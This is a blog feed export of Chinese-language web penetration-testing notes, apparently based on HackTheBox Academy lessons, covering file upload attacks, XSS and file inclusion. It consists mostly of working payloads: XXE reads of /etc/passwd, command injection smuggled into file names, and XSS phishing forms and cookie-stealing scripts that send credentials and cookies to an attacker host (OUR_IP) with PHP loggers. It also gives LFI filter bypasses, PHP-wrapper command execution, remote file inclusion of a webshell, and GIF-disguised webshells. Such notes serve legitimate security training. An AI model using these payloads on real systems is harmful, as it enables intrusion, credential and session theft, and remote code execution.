Documents</code> …</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XXE 读取 PHP Web 应用程序中的源代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>&gt;</span> ]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p><code>Denial of Service (DOS)</code></p><p>…</p><h2 id="文件名中的注入"><a href="#文件名中的注入" class="headerlink" title="文件名中的注入"></a>文件名中的注入</h2><p>命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file$(whoami).jpg  </span><br><span class="line">file`whoami`.jpg  </span><br><span class="line">file.jpg||whoami</span><br></pre></td></tr></table></figure><p>XSS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(window.origin);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>SQLi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x27;;select+sleep(5);--.jpg</span><br></pre></td></tr></table></figure><h2 id="上传目录披露"><a href="#上传目录披露" class="headerlink" title="上传目录披露"></a>上传目录披露</h2><p>在某些文件上传表单（如反馈表单或提交表单）中，可能无法访问上传文件的链接，也可能不知道上传目录。在这种情况下，可以利用模糊测试来查找上传目录，甚至使用其他漏洞（例如 LFI&#x2F;XXE）通过阅读 Web 应用程序源代码来查找上传文件的位置，就像在上一节中看到的那样。</p><p>另一种方法来泄露上传目录，即强制错误消息，因为它们通常会透露有助于进一步利用的信息。即上传一个名称已存在的文件或同时发送两个相同的请求。这可能会导致 Web 服务器显示无法写入文件的错误，从而泄露上传目录。还可以尝试上传名称过长的文件（例如 5,000 个字符）。如果 Web 应用程序无法正确处理此问题，也可能会出错并泄露上传目录。</p><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-Site Scripting (XSS)</title>
      <link href="/2024/10/12/pentest/web-pentest/XSS/"/>
      <url>/2024/10/12/pentest/web-pentest/XSS/</url>
      
        <content type="html"><![CDATA[<p>XSS 漏洞主要有三种类型：</p><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>最严重的 XSS 类型，发生在用户输入存储在后端数据库并在检索时显示（例如，帖子或评论）时</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>用户输入经过后端服务器处理后显示在页面上，但未被存储（例如搜索结果或错误信息）时发生</td></tr><tr><td><code>DOM-based XSS</code></td><td>另一种非持久性 XSS 类型，当用户输入直接显示在浏览器中并完全在客户端处理，而无需到达后端服务器（例如，通过客户端 HTTP 参数或锚标记）时发生</td></tr></tbody></table><h1 id="污染页面元素"><a href="#污染页面元素" class="headerlink" title="污染页面元素"></a>污染页面元素</h1><p>更改背景</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&quot;#141d2b&quot;</span>&lt;/script&gt;  </span><br><span class="line">  </span><br><span class="line"># or  </span><br><span class="line">  </span><br><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>更改标题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;HackTheBox Academy&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>更改文本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;todo&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;New Text&quot;</span>  </span><br><span class="line">  </span><br><span class="line"># or  </span><br><span class="line">  </span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span> = <span class="string">&quot;New Text&quot;</span></span><br></pre></td></tr></table></figure><p> XSS payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;center&gt;&lt;h1 style=&quot;color: white&quot;&gt;Cyber Security Training&lt;/h1&gt;&lt;p style=&quot;color: white&quot;&gt;by &lt;img src=&quot;https://academy.hackthebox.com/images/logo-htb.svg&quot; height=&quot;25px&quot; alt=&quot;HTB Academy&quot;&gt; &lt;/p&gt;&lt;/center&gt;&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/202412081952735.png" alt="image.png"></p><h1 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h1><p>Phishing form</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Please login to continue<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://OUR_IP</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.write(&#x27;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#x27;);&lt;!--  </span><br><span class="line">  </span><br><span class="line">&lt;!-- 删除某些元素 &gt;  </span><br><span class="line">document.getElementById(&#x27;urlform&#x27;).remove();</span><br></pre></td></tr></table></figure><p>Server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nv -lvnp 80</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;creds.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);  </span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>, <span class="string">&quot;Username: <span class="subst">&#123;$_GET[&#x27;username&#x27;]&#125;</span> | Password: <span class="subst">&#123;$_GET[&#x27;password&#x27;]&#125;</span>\n&quot;</span>);  </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://SERVER_IP/phishing/index.php&quot;</span>);  </span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line">    <span class="keyword">exit</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Hijacking"><a href="#Hijacking" class="headerlink" title="Hijacking"></a>Hijacking</h1><p>Fuzz</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//OUR_IP&gt;&lt;/script&gt;  </span></span><br><span class="line"><span class="string">&#x27;&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;  </span></span><br><span class="line"><span class="string">&quot;&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;  </span></span><br><span class="line"><span class="string">javascript:eval(&#x27;</span><span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(\<span class="string">&#x27;script\&#x27;);a.src=\&#x27;http://OUR_IP\&#x27;;document.body.appendChild(a)&#x27;</span>)  </span><br><span class="line">&lt;script&gt;<span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;<span class="built_in">eval</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;a=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();a.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, b);a.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;//OUR_IP&quot;</span>);a.<span class="title function_">send</span>();&lt;/script&gt;  </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">getScript</span>(<span class="string">&quot;http://OUR_IP&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>  </span><br><span class="line">  </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script src=http://OUR_IP/script.js&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure><p>Server</p><p>script.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://OUR_IP/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;http://OUR_IP/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;;&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;  </span><br><span class="line">        <span class="variable">$cookie</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$value</span>);  </span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookies.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);  </span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>, <span class="string">&quot;Victim IP: <span class="subst">&#123;$_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;</span> | Cookie: <span class="subst">&#123;$cookie&#125;</span>\n&quot;</span>);  </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Inclusion</title>
      <link href="/2024/10/10/pentest/web-pentest/File%20Inclusion/"/>
      <url>/2024/10/10/pentest/web-pentest/File%20Inclusion/</url>
      
        <content type="html"><![CDATA[<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><p>下表显示了哪些函数可以执行文件以及哪些函数只能读取文件内容：</p><table><thead><tr><th>功能</th><th>阅读内容</th><th>执行</th><th>远程 URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>&#x2F;<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>&#x2F;<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>file_get_contents()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>fopen()</code>&#x2F;<code>file()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>fs.readFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>fs.sendFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>@Html.Partial()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>@Html.RemotePartial()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>Response.WriteFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><p>常见可读文件<code>C:\Windows\boot.ini</code> 和 <code>/etc/passwd</code>，结合FUZZ技术测试。</p><h2 id="Baisc-bypass"><a href="#Baisc-bypass" class="headerlink" title="Baisc bypass"></a>Baisc bypass</h2><h3 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h3><p>针对 LFI 的最基本过滤器之一是搜索和替换过滤器，它只是删除 ( <code>../</code>) 的子字符串以避免路径遍历（非递归）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$point = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;point&#x27;]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//</span><br></pre></td></tr></table></figure><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>某些 Web 过滤器可能会阻止包含某些 LFI 相关字符（如用于路径遍历的点<code>.</code>或斜线）的输入过滤<code>/</code>器。但是，其中一些过滤器可能会通过对输入进行 URL 编码来绕过，这样它就不再包含这些坏字符，但一旦到达易受攻击的函数，仍会被解码回路径遍历字符串。版本 5.3.4 及更早版本上的核心 PHP 过滤器特别容易受到这种绕过的影响，但即使在较新的版本中，也可能发现可以通过 URL 编码绕过的自定义过滤器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../</span><br><span class="line">%2e%2e%2f</span><br></pre></td></tr></table></figure><h3 id="批准路径"><a href="#批准路径" class="headerlink" title="批准路径"></a>批准路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^\.\/languages\/.+$/&#x27;, $_GET[&#x27;point&#x27;])) &#123;</span><br><span class="line">    include($_GET[&#x27;point&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;Illegal path specified!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./languages/../../../../etc/passwd</span><br></pre></td></tr></table></figure><h3 id="附加扩展"><a href="#附加扩展" class="headerlink" title="附加扩展"></a>附加扩展</h3><p>某些 Web 应用程序会将扩展名附加到输入字符串（例如<code>.php</code>），以确保包含的文件具有预期的扩展名。使用现代版本的 PHP，可能无法绕过这一点，并且只能读取该扩展名的文件。</p><p>与 PHP 的现代版本已过时，仅适用于 5.3&#x2F;5.4 之前的 PHP 版本。</p><h4 id="路径截断"><a href="#路径截断" class="headerlink" title="路径截断"></a>路径截断</h4><p>在早期版本的 PHP 中，定义的字符串的最大长度为 4096 个字符，这可能是由于 32 位系统的限制。如果传递了更长的字符串，它将被截断，并且最大长度之后的任何字符都将被忽略。此外，PHP 还习惯于删除路径名中的尾部斜杠和单个点，因此如果调用 (<code>/etc/passwd/.</code>)，那么 <code>/.</code> 也将被截断，并且 PHP 将调用 (<code>/etc/passwd</code>)。PHP 和 Linux 系统通常也会忽略路径中的多个斜杠（例如 <code>////etc/passwd</code> 与 <code>/etc/passwd</code> 相同）。同样，路径中间的当前目录快捷方式 (.) 也将被忽略（例如 <code>/etc/./passwd</code>）。</p><p>如果将这两个 PHP 限制结合在一起，可以创建非常长的字符串，这些字符串可以计算为正确的路径。每当达到 4096 个字符的限制时，附加的扩展名 (.php) 就会被截断，并且将得到一个没有附加扩展名的路径。最后，还需要注意的是，还需要<code>start the path with a non-existing directory</code>此技术发挥才能发挥作用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n &quot;non_existing_directory/../../../etc/passwd/&quot; &amp;&amp; for i in &#123;1..2048&#125;; do echo -n &quot;./&quot;; done</span><br><span class="line"></span><br><span class="line">non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././</span><br></pre></td></tr></table></figure><p>还可以增加<code>../</code>的数量，因为添加更多数量仍会让进入根目录。如果使用此方法，应该计算字符串的整个长度，以确保只有<code>.php</code>或其他扩展被截断，而不是字符串末尾的请求文件（<code>/etc/passwd</code>）。</p><h4 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h4><p>PHP 5.5 之前的版本容易受到<code>null byte injection</code>的影响，这意味着在字符串末尾添加一个空字节 (<code>%00</code>) 将终止该字符串，并且不会考虑其后的任何内容。这是由于字符串在低级内存中的存储方式造成的，内存中的字符串必须使用空字节来指示字符串的结尾，就像在汇编语言、C 或 C++ 语言中看到的那样。</p><p>为了利用此漏洞，可以用空字节（例如<code>/etc/passwd%00</code>）结束有效载荷，这样传递给的最终路径<code>include()</code>将是（<code>/etc/passwd%00.php</code>）。这样，即使<code>.php</code>将附加到字符串，空字节后面的任何内容都会被截断，因此使用的路径实际上是<code>/etc/passwd</code>，从而导致绕过附加的扩展名。</p><h2 id="PHP-Filters"><a href="#PHP-Filters" class="headerlink" title="PHP Filters"></a>PHP Filters</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><p>example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Security/dict/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u &#x27;http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=FUZZ&#x27; -ic -fs 2000</span><br></pre></td></tr></table></figure><h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><p>Php 配置文件 <code>/etc/php/x.y/apache2/php.ini</code></p><h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>depend</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = on</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=data://text/plain;base64_string</span><br></pre></td></tr></table></figure><h3 id="input"><a href="#input" class="headerlink" title="input:&#x2F;&#x2F;"></a>input:&#x2F;&#x2F;</h3><p>depend</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = on</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=php://input&amp;0=id</span><br><span class="line"></span><br><span class="line">POST:&lt;?php system($_REQUEST[0]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><p>depend</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension = expect</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=expect://id</span><br></pre></td></tr></table></figure><h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><table><thead><tr><th>功能</th><th>阅读内容</th><th>执行</th><th>远程 URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>&#x2F;<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>file_get_contents()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>@Html.RemotePartial()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><p>depend</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># webshell</span><br><span class="line">echo &#x27;&lt;?php system($_GET[0]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># HTTP</span><br><span class="line">python3 -m http.server 80</span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=http://server/shell.php&amp;0=id</span><br><span class="line"></span><br><span class="line"># FTP</span><br><span class="line">python -m pyftpdlib -p 21</span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=ftp://user:pass@server/shell.php&amp;0=id</span><br><span class="line"></span><br><span class="line"># SMB 不需要 allow_url_include</span><br><span class="line">impacket-smbserver -smb2support share $(pwd)</span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=\\server\share\shell.php&amp;0=id</span><br></pre></td></tr></table></figure><h2 id="File-Upload-LFI"><a href="#File-Upload-LFI" class="headerlink" title="File Upload &amp; LFI"></a>File Upload &amp; LFI</h2><table><thead><tr><th>功能</th><th>阅读内容</th><th>执行</th><th>远程 URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>&#x2F;<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>&#x2F;<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># webshell</span><br><span class="line">echo &#x27;GIF89a&lt;?php system($_GET[0]);?&gt;&#x27; &gt; shell.gif</span><br></pre></td></tr></table></figure><p>将上传的文件包含到 LFI 漏洞中（需要找到图片路径，fuzz）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=./images/shell.gif&amp;0=id</span><br></pre></td></tr></table></figure><h3 id="Zip"><a href="#Zip" class="headerlink" title="Zip"></a>Zip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># webshell</span><br><span class="line">echo &#x27;&lt;?php system($_GET[0]);?&gt;&#x27; &gt; shell.php 